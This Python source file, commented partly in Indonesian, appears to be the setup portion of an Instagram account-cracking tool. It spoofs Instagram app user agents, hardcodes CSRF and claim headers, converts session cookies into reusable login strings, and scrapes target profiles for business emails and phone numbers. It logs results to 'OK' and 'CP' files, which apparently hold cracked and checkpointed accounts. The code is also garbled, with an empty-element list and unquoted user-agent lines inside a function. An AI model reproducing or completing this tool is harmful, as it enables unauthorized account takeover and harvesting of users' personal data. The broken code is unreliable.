import urllib.parse
from urllib.parse import quote
import re, os, sys, json, random, urllib, urllib.request, hmac, hashlib, time, string, uuid, requests, base64,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,json,os,sys,random,datetime,time,re
from bs4 import BeautifulSoup as bsp
from rich.console import Console
from rich.panel import Panel 
from rich import print as prints
import threading
from rich.console import Console as sol
import time
from rich.tree import Tree
from rich.table import Table as me
import datetime
from rich.columns import Columns
from rich.progress import Progress,TextColumn,SpinnerColumn
from string import *
xyz=[]
# Define color codes for output styling
B = '\x1b[1;94m'  # BLUE
U = '\x1b[1;95m'  # PURPLE
O = '\x1b[1;96m'  # LIGHT BLUE
N = '\x1b[0m'     # RESET
H = "\033[0;92m"   # GREEN
K = "\033[0;93m"   # YELLOW
M = '\x1b[1;91m'   # RED
P = "\033[0m"      # WHITE
P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = "\033[33m"
M, K2 = K, K
P = '\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
H = '\x1b[1;92m' # HIJAU +
h = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
B = '\x1b[1;94m'
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
H = "\033[0;92m" # HIJAU
K = "\033[0;93m" #KUNING
M = '\x1b[1;91m' # MERAH
P = "\033[0m" # PUTIH

#------------------[ WARNA FOR RICH ]-------------------#
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#------------------[ RANDOM COLOR RICH ]-------------------#
L1 = "[#875f5f]" # LIGHT
G1  = "[#ffd700]" # GOLD
M1  = "[#875fd7]" # MEDIUM GREEN
P1   = "[#FF00FF]" # PINK
W1  = "[#FFFFFF]" # WHITE
S1   = "[#87afff]" # SKY BLUE
O1   = "[#d78700]" # ORANGE3
O3   = "[#ff5fff]" # MEDIUM ORCH3

#------------------[ COLOR TABLE FOR RICH ]-------------------#
LIGHT = "#875f5f" # LIGHT
GOLD    = "#ffd700" # GOLD
MEDIUM  = "#875fd7" # MEDIUM GREEN
PINK    = "#FF00FF" # PINK
WHITE  = "#FFFFFF" # WHITE
SKY     = "#87afff" # SKY BLUE
ORNG   = "#d78700" # ORANGE3
ORCH   = "#ff5fff" # MEDIUM ORCH

ses = requests.Session()
X_IG_APP_ID = random.choice(["936619743392459" , "2763362503905702" , "1217981644879628"])
IG_API = 'https://i.instagram.com/api/v1/'
IG_URL = 'z.p42.www.instagram.com'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': X_IG_APP_ID,'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
headers_log = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/x-www-form-urlencoded',
}

xx = 0
rr = random.randint;rc = random.choice
console = Console()
Uid, Uuid , Uuid4= [], [], []
Ok, Cp, Loop = 0, 0, 0
getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
userinfo  = 'https://i.instagram.com/api/v1/users/{id!s}/info/'


dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
Okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
Cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def Android_Version(android_version):
	if str(android_version) == '9':
		return ('28')
	elif str(android_version) == '10':
		return ('29')
	elif str(android_version) == '11':
		return ('30')
	elif str(android_version) == '12':
		return ('31')
	else:
		return ('32')

def UserAgentApp():
	code = random.choice(['370911961','370911964','370911965','370911966','370911967','370911968','370911971','370911972','370911973','370911974','370911975','370911976','370911977','371025731'])
	app_version = random.randint(100, 342)
	android_version = random.randint(25, 31)
	app_patch_version = random.randint(14, 46)
	build_number = random.randint(85, 125)
	bahasa = random.choice(['en_US', 'id_ID'])
	realme = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; realme; RMX3782; RE5C6CL1; mt6835; {bahasa}; {code})'
	huawai = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/10; 480dpi; 1080x2282; HUAWEI; FRL-L22; HWFRL-M; mt6768; {bahasa}; {code})'
	samsung = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; samsung; SM-A225F; A225FXXU3BVF1; mt6768; {bahasa}; {code})'
	xiaomi = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; Xiaomi; Redmi 9A; M2006C3LG; mt6768; {bahasa}; {code})'
	vivo = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; vivo; vivo 2007; PD1969F_EX; mt6768; {bahasa}; {code})'
	oppo = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; OPPO; CPH2083; CPH2083_11_A.53; mt6768; {bahasa}; {code})'
	iphone = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} iOS ({android_version}/14; 2; iPhone; iPhone 12; iPhone12,1; {bahasa}; {code})'
	iphone_x = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} iOS ({android_version}/14; 2; iPhone; iPhone X; iPhone10,3; {bahasa}; {code})'
	google_pixel = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Google; Pixel 5; GD1Y; mt6768; {bahasa}; {code})'
	infinix = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Infinix; Infinix Note 10; X6812; mt6768; {bahasa}; {code})'
	pragmatyc = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Pragmatyc; Pragmatyc Device; PGT-1; mt6768; {bahasa}; {code})'
	return random.choice([realme, huawai, samsung, xiaomi, vivo, oppo, iphone, iphone_x, google_pixel, infinix, pragmatyc])


def InstagramX():
    rr = random.randint
    rc = random.choice
    version_android = rc(["4.4.2", "4.4.3", "4.4.4", "4.4.5", "4.4.6", "4.4.7", "4.4.8", "4.4.9", "5.0", "5.0.1","5.0.2", "5.1.1", "6.0", "6.0.1", "6.0.2", "6.0.3", "6.0.4", "7.0", "7.1.1", "7.1.2", "8.0.0", "8.1.0", "9", "10", "11", "12", "13"])
    version_ios = rc(["10_3_3","10_3_2","9_3_5","11_2_6", "11_2_7", "11_2_8", "11_2_9", "11_2_10", "11_2_11", "11_2_12", "11_2_13", "11_2_14", "11_2_15"])
    cromonium_android = str(random.randint(20,99))+".0."+str(random.randint(9,9999))+"."+str(random.randint(50,999))
    merek_android = rc([,,,,,,,,,,,,,,,,,"m2 Build/LMY47D","HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196","Redmi Note 4 Build/NRD90M","SM-G950F Build/R16NW;","SM-G950F Build/NRD90M","SM-E500H Build/LMY47X","LG-H815 Build/LMY47D","SM-G935F Build/NRD90M","XT1585 Build/NCK25.118-10.5","SM-N910F Build/MMB29M","7048X Build/LRX22G","LG-D331 Build/KOT49I","HUAWEI VNS-L31 Build/HUAWEIVNS-L31","SM-J730F Build/NRD90M","MX6 Build/MRA58K"])
	merek_ios = rc(["SM","SMG","VZ","VZW"])
    Mozilla/5.0 (iPhone; CPU iPhone OS  like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; pt_PT; pt-PT; scale=2.34; gamut=normal; 750x1331)
Mozilla/5.0 (Linux; Android ; SM-N910F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-N910F; trlte; qcom; pt_PT; 98288242)
Mozilla/5.0 (Linux; Android ; 7048X Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.2; 320dpi; 720x1280; TCL; 7048X; alto5_sporty; qcom; pt_PT; 98288239)
Mozilla/5.0 (Linux; Android ; LG-D331 Build/KOT49I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (19/4.4.2; 240dpi; 480x782; LGE/lge; LG-D331; luv80ss; mt6582; es_VE; 98288237)
Mozilla/5.0 (Linux; Android ; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1812; HUAWEI; HUAWEI VNS-L31; HWVNS-H; hi6250; pt_PT; 98288242)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_2_6; pt_PT; pt-PT; scale=2.00; gamut=normal; 750x1334)
Mozilla/5.0 (iPhone; CPU iPhone OS  like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 Instagram 37.0.0.9.96 (iPad2,5; iPhone OS 9_3_5; pt_PT; pt-PT; scale=2.00; gamut=normal; 960x640)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,4; iOS 11_2_6; en_US; en-US; scale=2.88; gamut=wide; 1080x1920)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,1; iOS 11_2_6; uk_UA; uk-UA; scale=2.00; gamut=wide; 750x1334)
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 Instagram 37.0.0.9.96 (iPhone9,4; iOS 10_3_3; ru_RU; ru-RU; scale=2.61; gamut=wide; 1080x1920)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; de_DE; de-DE; scale=2.00; gamut=normal; 750x1334)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,4; iOS 11_2_6; de_DE; de-DE; scale=2.00; gamut=wide; 750x1334)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_2_6; hu_HU; hu-HU; scale=2.00; gamut=wide; 750x1334)
Mozilla/5.0 (Linux; Android 7.0; SM-J730F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870; de_DE; 98288242)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,5; iOS 11_2_6; ru_RU; ru-RU; scale=2.61; gamut=wide; 1080x1920)
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 Instagram 37.0.0.9.96 (iPhone7,2; iOS 10_3_2; ru_RU; ru-RU; scale=2.00; gamut=normal; 750x1334)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)
Mozilla/5.0 (Linux; Android 6.0; MX6 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1920; Meizu; MX6; MX6; mt6797; ru_RU; 98288242)
Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM3.171019.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (27/8.1.0; 420dpi; 1080x1794; LGE/google; Nexus 5X; bullhead; bullhead; ru_UA; 98288242)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_2_2; ru_UA; ru-UA; scale=2.00; gamut=wide; 750x1334)
Mozilla/5.0 (Linux; Android 5.1.1; SM-E500H Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1.1; 320dpi; 720x1280; samsung; SM-E500H; e53g; qcom; ru_RU; 98288239)
Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 560dpi; 1440x2560; samsung; SM-G925F; zerolte; samsungexynos7420; uk_UA; 98288242)
Mozilla/5.0 (Linux; Android 5.1.1; Lenovo A6020a40 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1.1; 320dpi; 720x1280; LENOVO/Lenovo; Lenovo A6020a40; A6020a40; qcom; ru_RU; 98288239)
Mozilla/5.0 (Linux; Android 5.1; LG-H815 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1; 640dpi; 1440x2392; LGE/lge; LG-H815; p1; p1; uk_UA; 98288242)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,4; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=wide; 750x1334)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A372 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_0; ru_US; ru-US; scale=2.00; gamut=wide; 750x1334)
Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-G935F; hero2lte; samsungexynos8890; ru_RU; 98288242)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 37.0.0.9.96 (iPhone8,2; iOS 11_2_5; uk_UA; uk-UA; scale=2.61; gamut=normal; 1080x1920)
Mozilla/5.0 (Linux; Android 7.0; XT1585 Build/NCK25.118-10.5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 640dpi; 2368x1440; motorola; XT1585; kinzie; qcom; ru; 98288242)
Mozilla/5.0 (Linux; Android 7.0; SM-G950F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; de_DE; 98288242)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,5; iOS 11_2_6; de_DE; de-DE; scale=2.61; gamut=wide; 1080x1920)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,4; iOS 11_2_6; uk_UA; uk-UA; scale=2.00; gamut=normal; 640x1136)
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 Instagram 37.0.0.9.96 (iPhone6,1; iOS 10_3_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 37.0.0.9.96 (iPhone8,4; iOS 11_2_5; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 Instagram 37.0.0.9.96 (iPhone10,6; iOS 11_2_1; en_US; en-US; scale=3.00; gamut=wide; 1125x2436)
Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)
Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (26/8.0.0; 480dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; ru_UA; 98288242)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPad6,3; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=wide; 640x960)
Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; uk_UA; 98288242)
Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone6,2; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)
Mozilla/5.0 (Linux; Android 5.1; m2 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.114 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1; 320dpi; 720x1280; Meizu; m2; m2; mt6735; ru_RU; 98288239)
Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0.1; 480dpi; 1080x1920; Xiaomi; Redmi 4; markw; qcom; ru_RU; 98288242)
Mozilla/5.0 (Linux; Android 7.0; MI MAX Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 440dpi; 1080x1920; Xiaomi; MI MAX; hydrogen; qcom; ru_RU; 98288242)
Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A5000 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (26/8.0.0; 480dpi; 1080x1920; OnePlus; ONEPLUS A5000; OnePlus5; qcom; ru_UA; 98288242)
Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1920x1080; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; ru_RU; 98288242)
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 Instagram 37.0.0.9.96 (iPhone4,1; iPhone OS 9_3_5; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x960)
Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1; 480dpi; 1080x1920; Meizu; m3 note; m3note; mt6755; ru_RU; 98288242)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 37.0.0.9.96 (iPhone10,5; iOS 11_2_5; de_DE; de-DE; scale=2.88; gamut=wide; 1080x1920)
Mozilla/5.0 (Linux; Android 6.0; PRO 6 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1920; Meizu; PRO 6; PRO6; mt6797; ru_RU; 98288242)
Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-A510F; a5xelte; samsungexynos7580; de_DE; 98288242)
Mozilla/5.0 (Linux; Android 4.4.2; GT-I9301I Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (19/4.4.2; 320dpi; 720x1280; samsung; GT-I9301I; s3ve3g; qcom; hu_HU; 98288239)
Mozilla/5.0 (Linux; Android 7.0; SM-G950U Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x2076; samsung; SM-G950U; dreamqltesq; qcom; en_US; 98288242)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_2_6; en_UA; en-UA; scale=2.00; gamut=normal; 750x1334)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 Instagram 37.0.0.9.96 (iPhone10,5; iOS 11_2_2; de_DE; de-DE; scale=2.61; gamut=wide; 1080x1920)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone6,1; iOS 11_2_6; uk_UA; uk; scale=2.00; gamut=normal; 640x1136)
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 Instagram 37.0.0.9.96 (iPhone4,1; iPhone OS 9_3_5; uk_UA; ru-UA; scale=2.00; gamut=normal; 640x960)
Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_2 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A421 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_0_2; uk_UA; uk-UA; scale=2.00; gamut=normal; 750x1334)









def generate_random_ua():
    devices = ['Android', 'iPhone', 'Windows']
    os_version = random.choice(['10', '11', '12'])
    device_type = random.choice(devices)
    browser_version = random.randint(40, 100)
    ua = f"Mozilla/5.0 ({device_type}; {os_version} OS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{browser_version}.0.0.0 Mobile Safari/537.36"
    return ua

def convert_cookie(item):
	try:
		sesid = 'sessionid=' + re.findall(r'sessionid=(\d+)', str(item))[0]
		ds_id = 'ds_user_id=' + re.findall(r'ds_user_id=(\d+)', str(item))[0]
		csrft = 'csrftoken=' + re.findall(r'csrftoken=(.*?);', str(item))[0]
		donez = '%s;%s;%s;ig_nrcb=1;dpr=2'%(ds_id, sesid, csrft)
	except Exception as e:
		donez = 'cookies tidak di temukan, error saat convert'
	return donez

def data_target(name):
	for y in name.split(','):
		try:
			HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :'1217981644879628'})
			profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
			post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
			peng  = profil_info_target["edge_followed_by"]["count"]
			meng = profil_info_target["edge_follow"]["count"]
			mail = profil_info_target["business_email"]
			phone = profil_info_target["business_phone_number"]
			fullname = profil_info_target["full_name"]
